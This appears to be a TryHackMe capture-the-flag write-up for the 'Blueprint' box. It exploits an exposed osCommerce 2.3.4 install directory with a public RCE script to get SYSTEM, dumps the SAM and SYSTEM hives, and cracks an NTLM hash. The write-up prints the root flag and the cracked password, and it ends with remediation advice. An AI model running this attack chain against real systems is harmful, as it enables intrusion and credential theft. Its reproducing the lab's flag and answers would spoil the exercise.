# TryHackMe — **Blueprint** (osCommerce 2.3.4) — Writeup

> Compact, step-by-step walkthrough of the box you ran (notes, commands, key output, and remediation).
> Tested against host `10.10.228.232` (your local lab run).

---

## 1) Recon — nmap

Run a comprehensive scan with default scripts, version detection and common scripts:

```bash
sudo nmap -sC -sV -A 10.10.228.232 -oN nmap-blueprint.txt
```

Key findings (trimmed):

* Host up, Windows box (NetBIOS name: `BLUEPRINT`)
* Open / interesting ports:

  * `80/tcp`  — Microsoft IIS 7.5 (404 title)
  * `443/tcp` — Apache/2.4.23 (Win32) + HTTP index shows `oscommerce-2.3.4/`
  * `8080/tcp` — Apache/2.4.23 (Win32) + `Index of /` shows `oscommerce-2.3.4/`
  * `445/tcp` — Microsoft-DS (Windows 7 Home Basic SP1)
  * `3306/tcp` — MariaDB (unauthorized)
* SMB: Windows 7 Home Basic SP1, message signing disabled (dangerous), guest account available.

> The presence of an `oscommerce-2.3.4` install directory is the low-hanging fruit (known vulnerable version).

---

## 2) Search for public exploits

Searchsploit returned multiple results for osCommerce 2.3.4/2.3.4.1 (RCEs, arbitrary upload, SQLi, etc.):

```bash
searchsploit oscommerce 2.3.4
```

Notable exploit files present locally in `exploitdb`:

* `php/webapps/44374.py`  — RCE
* `php/webapps/50128.py`  — RCE (used)
* `php/webapps/50129.py` etc.

---

## 3) Exploit — using the install directory RCE

The install directory is accessible, which many osCommerce installers leave writable or allow command injection. You ran the included exploit script against the catalog install path:

```bash
cd /usr/share/exploitdb/exploits/php/webapps
python 50128.py http://10.10.228.232:8080/oscommerce-2.3.4/catalog/
```

Script output showed you got a remote shell as `NT AUTHORITY\SYSTEM`:

```
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$
```

You enumerated files and found `configure.php` in the install includes and the `root.txt.txt` on the Administrator desktop:

```text
type C:\Users\Administrator\Desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

---

## 4) Dumping registry hives for offline hash extraction

From the RCE shell you exported the relevant hives:

```text
reg.exe save hklm\system SYSTEM
reg.exe save hklm\sam SAM
```

You downloaded those two files to your Kali `Downloads` and used `samdump2` to extract SAM hashes:

```bash
samdump2 SYSTEM SAM
```

Output (relevant lines):

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

* `aad3b435...` in the LM field indicates LM is not stored (placeholder).
* The NTLM hash for the `Lab` user is: `30e87bf999828446a1c1209ddde4c450`

---

## 5) Cracking the `Lab` NTLM hash

You cracked the `Lab` NTLM hash using CrackStation (or a local cracking tool); the password is:

```
Lab -> googleplus
```

(You noted: `Labs hash is googleplus from crackstation`.)

If you wanted to reproduce locally, example commands:

**John the Ripper**

```bash
# convert to john format or create a file with the hash line:
echo "Lab:1000:30e87bf999828446a1c1209ddde4c450" > lab.hash
# john --format=NT --wordlist=/path/to/rockyou.txt lab.hash
```

**Hashcat**

```bash
# save hash as 30e87bf999828446a1c1209ddde4c450
# -m 1000 is MS­-CHAPv2/NTLM? (NTLM actually mode 1000 historically)
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
```

---

## 6) Summary of important artefacts / flags

* **Root flag** (Administrator desktop):

  ```
  THM{aea1e3ce6fe7f89e10cea833ae009bee}
  ```
* **User hash row (samdump2 output):**

  ```
  Lab:1000:...:30e87bf999828446a1c1209ddde4c450:::
  ```
* **Cracked password for `Lab`:** `googleplus`

---

## 7) Post-exploitation notes & recommended cleanup

* **From an ethical lab POV**, you obtained SYSTEM via a public RCE in an exposed `install` folder. This is expected in boxes designed to teach full compromise.
* **Defensive / remediation suggestions** (what a real org should do):

  1. **Remove installer files**: never leave `/install` or setup pages accessible in production.
  2. **Patch / upgrade**: update osCommerce to a supported version; apply vendor security patches.
  3. **Harden webserver / PHP**: disable unnecessary modules, disable `exec`/`system` calls where possible, run services with least privilege.
  4. **Network segmentation**: isolate web servers from critical internal resources (DB, SMB).
  5. **Disable weak protocols**: turn on SMB signing, disable guest/anonymous where not required.
  6. **Rotate credentials**: after compromise, rotate passwords for local accounts and any reused credentials.
  7. **Harden MySQL**: secure DB with strong passwords and restrict access to trusted hosts.
  8. **Monitoring / IDS**: deploy file integrity monitoring and web WAF rules to detect/stop install-page exploitation attempts.

---

## 8) TL;DR Playbook (what you typed)

1. `sudo nmap -sC -sV -A 10.10.228.232` → discovered osCommerce install on 8080/443
2. `searchsploit oscommerce 2.3.4` → find RCE exploit (50128.py)
3. `python 50128.py http://10.10.228.232:8080/oscommerce-2.3.4/catalog/` → got RCE as `NT AUTHORITY\SYSTEM`
4. `type C:\Users\Administrator\Desktop\root.txt.txt` → got root flag
5. `reg.exe save hklm\system SYSTEM` and `reg.exe save hklm\sam SAM` → downloaded SYSTEM & SAM
6. `samdump2 SYSTEM SAM` → extracted hashes
7. Cracked `Lab` NTLM hash → **googleplus**
